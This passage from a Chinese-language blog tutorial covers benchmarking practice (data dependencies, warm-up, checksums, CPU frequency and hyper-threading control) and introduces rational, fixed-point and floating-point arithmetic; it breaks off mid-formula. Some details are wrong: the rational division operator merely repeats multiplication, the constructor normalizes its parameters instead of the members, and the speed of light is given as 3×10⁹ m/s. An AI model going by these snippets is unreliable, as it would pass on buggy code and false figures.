<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bench</span>(<span class="params">source, n=<span class="number">2</span>**<span class="number">20</span></span>):</span><br><span class="line">    !make -s {source}</span><br><span class="line">    <span class="keyword">if</span> _exit_code != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Compilation failed"</span>)</span><br><span class="line">    res = !./{source} {n}</span><br><span class="line">    duration = <span class="built_in">float</span>(res[<span class="number">0</span>].split()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> duration</span><br></pre></td></tr></table></figure></div>
<p>在这个函数中，<code>make -s {source}</code>
会编译源代码并生成目标文件。如果编译失败，它会抛出异常。然后，使用
<code>!./{source} {n}</code> 运行编译后的程序并返回执行时间。</p>
<p>一旦有了基准测试的函数，你就可以轻松地编写清晰的分析代码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">ns = <span class="built_in">list</span>(<span class="built_in">int</span>(<span class="number">1.17</span>**k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">60</span>))</span><br><span class="line">baseline = [bench(<span class="string">'std_lower_bound'</span>, n=n) <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line">results = [bench(<span class="string">'my_binary_search'</span>, n=n) <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制不同数组大小下的相对加速图</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.plot(ns, [x / y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(baseline, results)])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></div>
<h4 id="获取准确的结果">获取准确的结果</h4>
<p>为了使测试的结果更加准确，我们需要考虑如下的几个点：</p>
<p><strong>1.不同的数据集</strong></p>
<p>由于很多算法的效率很大程度上受数据分布的影响，我们需要选取尽可能贴近实际使用的数据分布来进行测试。例如如下的有序数据集，会使分支很容易预测。而随机打乱的数据集就会让cpu难以通过执行的历史预测之后的分支取向。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// don't do this</span></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">1000</span>; a++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">1000</span>; b++)</span><br><span class="line">        checksum ^= gcd(a, b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// do things such as this</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>], b[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    a[i] = rand() % <span class="number">1000</span>, b[i] = rand() % <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="number">1000</span>; t++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">        checksum += gcd(a[i], b[i]);</span><br></pre></td></tr></table></figure></div>
<p><strong>2.多个优化目标</strong></p>
<p>如哈希表，可能需要在内存占用、查询时间等多个维度进行权衡。</p>
<p><strong>3.吞吐量 vs 延迟</strong></p>
<p>在现代 CPU 上，指令并不会<strong>严格顺序执行</strong>，而是可以
<strong>乱序执行</strong> 和
<strong>流水线并行处理</strong>。因此，如果一个任务<strong>可以与其他任务同时进行</strong>，那么它的<strong>吞吐量</strong>可能比<strong>单个操作的真实延迟更低</strong>。所以下面的代码只能测试吞吐量。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    q[i] = rand();  <span class="comment">// 生成随机查询</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= lower_bound(q[i]);  <span class="comment">// 查找 q[i] 并计算 checksum</span></span><br></pre></td></tr></table></figure></div>
<p>为了测试真实的延迟，我们需要手动引入数据依赖，这样子<strong>CPU
无法并行执行多个查询</strong>，每个 <code>lower_bound</code>
<strong>必须等待前一个完全结束</strong>，流水线和乱序执行的优化作用变小。测得的时间更接近单个查询的真实执行时间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= lower_bound(checksum ^ q[i]);  </span><br></pre></td></tr></table></figure></div>
<p><strong>4.冷缓存</strong></p>
<p>当数据最初不在 CPU
缓存（cache）中时，内存读取的时间会更长。在开始正式测量之前，<strong>先运行一次预热（warm-up）</strong>，这样数据就会被加载到缓存中，避免缓存未命中的影响：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 预热运行（warm-up run）</span></span><br><span class="line"><span class="keyword">volatile</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正式运行（actual run）</span></span><br><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line">checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br></pre></td></tr></table></figure></div>
<h4 id="过度优化over-optimization"><strong>过度优化（Over-Optimization）</strong></h4>
<p>有时<strong>基准测试（benchmark）本身是不正确的</strong>，因为编译器可能<strong>直接优化掉</strong>被测试的代码，导致测量结果没有意义。</p>
<p><strong>如何防止编译器优化掉基准测试？</strong></p>
<ol type="1">
<li><p><strong>使用校验和（checksum）</strong></p>
<p>在测试代码中使用 <code>checksum</code>
变量，并在最后输出，<strong>避免编译器省略计算</strong>。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checksum: %d\n"</span>, checksum); <span class="comment">// 防止优化</span></span><br></pre></td></tr></table></figure></div>
<p>如果 <code>lower_bound(q[i])</code>
的计算结果没有影响最终程序逻辑，编译器可能会认为它是<strong>无效计算</strong>并移除，导致错误的测量结果。</p></li>
<li><p><strong>使用 <code>volatile</code> 限定符</strong></p>
<p><code>volatile</code>关键字告诉编译器不要优化该变量的访问，确保它在每次循环迭代时都被真正计算：</p>
<p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br></pre></td></tr></table></figure></div></p>
<p>作用：</p>
<ul>
<li><p><strong>防止编译器优化掉整个计算过程</strong>。</p></li>
<li><p><strong>防止循环迭代之间的指令重排（interleaving）</strong>，确保按顺序执行。</p></li>
</ul></li>
</ol>
<h4 id="减少噪音">减少噪音</h4>
<p>在基准测试（benchmarking）中，除了<strong>偏差（bias）</strong>，还有<strong>噪声（noise）*<em>会影响测量结果。偏差通常会*</em>系统性地</strong>使某个算法占优，而噪声则会导致<strong>随机波动</strong>，增加测试的方差（variance），使结果不稳定。</p>
<p><strong>噪声的来源</strong></p>
<ol type="1">
<li><p><strong>外部干扰（Side Effects &amp; External
Noise）</strong></p>
<ul>
<li>其他进程运行时占用 CPU 资源，影响算法性能测试。</li>
<li>CPU 频率自动调节（CPU Frequency Scaling）。</li>
<li>超线程（Hyper-Threading）导致 CPU 资源共享，影响单核性能。</li>
</ul></li>
<li><p><strong>如何减少噪声？</strong></p>
<p><strong>使用 <code>perf stat</code> 统计 CPU
周期（cycles）</strong></p>
<ul>
<li>若基准测试的是<strong>计算密集型（compute-bound）算法</strong>，推荐使用
<code>perf stat</code> 直接测量 <strong>CPU
执行指令的周期</strong>，而不是依赖时间戳。</li>
<li>CPU 频率可能会波动，影响测试的时间，但
<code>perf stat</code>计数的指令周期数不会受到影响，这样可以得到一个独立于
CPU 频率波动的性能测量。</li>
</ul>
<p><strong>固定 CPU 频率</strong></p>
<ul>
<li><p>CPU
可能会根据负载自动调整频率，这会导致每次运行基准测试的结果不同，因此需要手动锁定频率：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> cpupower frequency-set -g performance  <span class="comment"># 设置为最高性能模式</span></span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> cpupower frequency-set -g powersave  <span class="comment"># 限制 CPU 频率最低</span></span><br></pre></td></tr></table></figure></div>
<p>这样可以确保 CPU 频率不会在测试过程中波动。</p></li>
<li><p><strong>关闭超线程（Hyper-Threading）</strong></p>
<ul>
<li><p>超线程允许 CPU
<strong>一个物理核心同时运行两个线程</strong>，但这可能导致基准测试结果受其他进程影响。</p></li>
<li><p>关闭超线程的方法：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> off | <span class="built_in">sudo</span> <span class="built_in">tee</span> /sys/devices/system/cpu/smt/control</span><br></pre></td></tr></table></figure></div></li>
<li><p>或者在 BIOS/UEFI 中手动禁用超线程。</p></li>
</ul></li>
<li><p><strong>绑定 CPU 核心，确保独占</strong></p>
<ul>
<li><p>如果希望某个程序只运行在特定 CPU 核心上，可以使用
<code>taskset</code> 绑定：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">taskset -c 0 ./my_program  <span class="comment"># 仅在 CPU 0 上运行</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>这样可以避免操作系统随意调度进程到不同核心，减少基准测试的波动。</p></li>
</ul></li>
<li><p><strong>关闭网络和不必要的进程</strong></p>
<ul>
<li>关闭后台进程，特别是可能影响 CPU
占用的任务，如自动更新、后台同步等。</li>
<li>关闭 Wi-Fi 和网络，以防止网络中断或后台任务影响基准测试。</li>
</ul></li>
<li><p><strong>尽量减少用户操作</strong></p>
<ul>
<li><strong>鼠标移动</strong>等 UI 交互会触发 CPU
处理中断，可能影响测试结果。</li>
</ul></li>
</ul></li>
</ol>
<p>即使采取了以上所有措施，仍然无法<strong>完全</strong>消除噪声。例如程序的名字也会影响执行速度。</p>
<ul>
<li>因为可执行文件名会存储在环境变量中，环境变量存储在<strong>调用栈（call
stack）</strong>中，导致栈的对齐（stack alignment）发生变化。</li>
<li>这可能会让数据访问跨越 <strong>cache line</strong> 或
<strong>内存页边界（memory page
boundary）</strong>，导致访问速度变慢。</li>
</ul>
<p><strong>如何正确分析基准测试结果</strong></p>
<ol type="1">
<li><strong>不要过分解读小幅度变化</strong>
<ul>
<li>在 <strong>笔记本电脑</strong> 或 <strong>测试时间小于 1 秒</strong>
时，<strong>±5%</strong>
的波动是完全正常的，不要过度解读微小的性能变化。</li>
<li>如果你看到 <strong>+1%</strong>
的性能提升，不要立刻下结论，而是<strong>运行足够多次，计算方差和
p-value</strong>，确保统计显著性（statistical significance）。</li>
</ul></li>
<li><strong>使用 A/B 测试方法</strong>
<ul>
<li>和 A/B
测试一样，要<strong>多次运行并比较</strong>两个版本的性能，不要只跑一次就下结论。</li>
<li>计算<strong>均值、方差、p
值</strong>，确保你的优化方案确实带来了可测量的提升。</li>
</ul></li>
</ol>
<h3 id="六算术arithmetic">六、算术（Arithmetic）</h3>
<h4 id="浮点数">浮点数</h4>
<p>事实上，浮点运算通常比整数运算更快，这是因为现代处理器中有专门的浮点运算指令。此外，浮点数的表示方法经过严格的标准化，并遵循<strong>简单且确定性</strong>的舍入规则，使得计算误差可以可靠地管理。当我们需要对数字执行<strong>位运算</strong>时，浮点运算单元（FPU，负责浮点计算的协处理器）通常<strong>不支持</strong>这些操作。此时，数值需要被<strong>转换为整数</strong>。</p>
<p>在正式介绍浮点数规则之前，我们可以先来看一下一些其它的可能的解决方案。</p>
<h5 id="符号表达式">符号表达式</h5>
<p>第一种也是最繁琐的方法是<strong>存储产生结果的代数表达式</strong>，而不是直接存储计算后的数值。在某些应用（如计算几何）中，除了加、减、乘运算之外，还需要执行<strong>不带舍入的除法</strong>，即使用两个整数的<strong>比值</strong>（即有理数）来精确表示结果。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">r</span> {</span><br><span class="line">    <span class="type">int</span> x, y;	<span class="comment">// x存分子，y存分母</span></span><br><span class="line">    <span class="comment">// 保持最简分数</span></span><br><span class="line">    <span class="built_in">r</span>(<span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y) {</span><br><span class="line">        <span class="keyword">if</span> (y &lt; <span class="number">0</span>)  <span class="comment">// 规范化，使分母始终为正</span></span><br><span class="line">            x = -x, y = -y;</span><br><span class="line">        <span class="type">int</span> g = <span class="built_in">gcd</span>(x, y); <span class="comment">// 计算最大公约数</span></span><br><span class="line">        x /= g;</span><br><span class="line">        y /= g;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一些基本运算</span></span><br><span class="line">r <span class="keyword">operator</span>+(r a, r b) { <span class="keyword">return</span> {a.x * b.y + a.y * b.x, a.y * b.y}; }</span><br><span class="line">r <span class="keyword">operator</span>*(r a, r b) { <span class="keyword">return</span> {a.x * b.x, a.y * b.y}; }</span><br><span class="line">r <span class="keyword">operator</span>/(r a, r b) { <span class="keyword">return</span> {a.x * b.x, a.y * b.y}; }</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(r a, r b) { <span class="keyword">return</span> a.x * b.y &lt; b.x * a.y; }</span><br></pre></td></tr></table></figure></div>
<p>这种方法可以<strong>保持绝对精度</strong>，不会因浮点运算误差导致结果不准确。但它的<strong>计算代价</strong>很高：</p>
<ol type="1">
<li>计算机需要存储每一步计算的<strong>历史操作</strong>，而不是简单存储最终数值。</li>
<li>计算时不仅要计算当前结果，还需要考虑所有之前的计算过程，这会导致<strong>计算量呈指数级增长</strong>。</li>
</ol>
<p>因此，这种方法通常适用于：</p>
<ul>
<li>计算精度要求极高的场景（如代数几何、数论）。</li>
<li>计算步骤相对较少的应用（如解析数学计算）。</li>
<li>计算机代数系统（CAS），如 Mathematica、SymPy 和 SageMath。</li>
</ul>
<p>但在一般数值计算中，由于其高昂的<strong>存储和计算成本</strong>，往往采用<strong>浮点数近似计算</strong>来提高效率。</p>
<h5 id="定点数">定点数</h5>
<p>定点数是一种<strong>仅使用整数</strong>但<strong>隐式表示小数</strong>的方法，本质上就是把数值<strong>乘以一个固定的比例因子</strong>（通常是某个
10 的幂或 2 的幂）。</p>
<p>这种方法类似于<strong>更改测量单位</strong>，让所有运算都在放大后的整数范围内进行。</p>
<p>金融软件通常使用<strong>固定精度</strong>来存储货币值，例如
<strong>NASDAQ 股票交易所</strong>使用 <strong>1/10000
美元</strong>作为最小单位，即所有金额精确到<strong>小数点后 4
位</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">money</span> {</span><br><span class="line">    uint v; <span class="comment">// 以 1/10000 美元为单位存储金额</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">to_string</span><span class="params">(money m)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> std::format(<span class="string">"${}.{:04d}"</span>, m.v / <span class="number">10000</span>, m.v % <span class="number">10000</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">money <span class="keyword">operator</span>*(money x, money y) {</span><br><span class="line">    <span class="keyword">return</span> {x.v * y.v / <span class="number">10000</span>}; <span class="comment">// 乘法需要缩放回正确的单位</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>定点数的一个重大问题是<strong>比例因子选得不合适</strong>时，可能会导致<strong>整数溢出</strong>或<strong>精度损失</strong>。定点数不适用于大范围数值计算。比如考虑爱因斯坦质能方程：<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="8.699ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3845.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mo" transform="translate(1041.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2097.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msup" transform="translate(2975.6,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mn" transform="translate(466,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container></span>。质量 <code>m</code> 大约是
<strong>1.67 × 10⁻²⁷ kg</strong>。光速 <code>c</code> 约为 <strong>3 ×
10⁹ m/s</strong>。</p>
<p>在这种场景下：</p>
<ul>
<li><strong>如果比例因子太大</strong>，那么 <code>m</code>
可能会被舍入到 <code>0</code>，导致能量计算错误。</li>
<li><strong>如果比例因子太小</strong>，那么 <code>E</code>
可能会溢出，导致计算无法进行。</li>
</ul>
<h5 id="浮点数-1">浮点数</h5>
<p>在实际的应用场景中，我们主要关注数据的相对误差。我们通常希望计算结果的误差不超过<strong>0.01%</strong>。我们关心的是这个误差相对于数值本身的比例，而不关心它的绝对大小。</p>
<p>为了满足这个需求，<strong>浮点数</strong>使用了一种特殊的存储方式，它存储一个数字的<strong>有效数字</strong>（又称<strong>尾数</strong>或<strong>manitssa</strong>），并通过一个<strong>指数</strong>（exponent）进行缩放。在计算机中，数值是用<strong>固定长度的二进制字</strong>来存储的，因此我们希望设计一种<strong>固定长度的二进制浮点格式</strong>，其中部分比特用于存储尾数（以提供更高的精度），而另一部分比特用于存储指数（以提供更大的数值范围）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fp</span> {</span></span><br><span class="line">    <span class="type">bool</span> s;     <span class="comment">// sign: "0" for "+", "1" for "-" </span></span><br><span class="line">    <span class="type">unsigned</span> m; <span class="comment">// mantissa</span></span><br><span class="line">    <span class="type">int</span> e;      <span class="comment">// exponent</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure></div>
<p>这样，一个浮点数可以表示为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="14.234ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6291.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="B1" d="M56 320T56 333T70 353H369V502Q369 651 371 655Q376 666 388 666Q402 666 405 654T409 596V500V353H707Q722 345 722 333Q722 320 707 313H409V40H707Q722 32 722 20T707 0H70Q56 7 56 20T70 40H369V313H70Q56 320 56 333Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1889.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2889.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3767.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4378.7,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(5378.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></g></svg></mjx-container></span> 其中，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span> 和 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 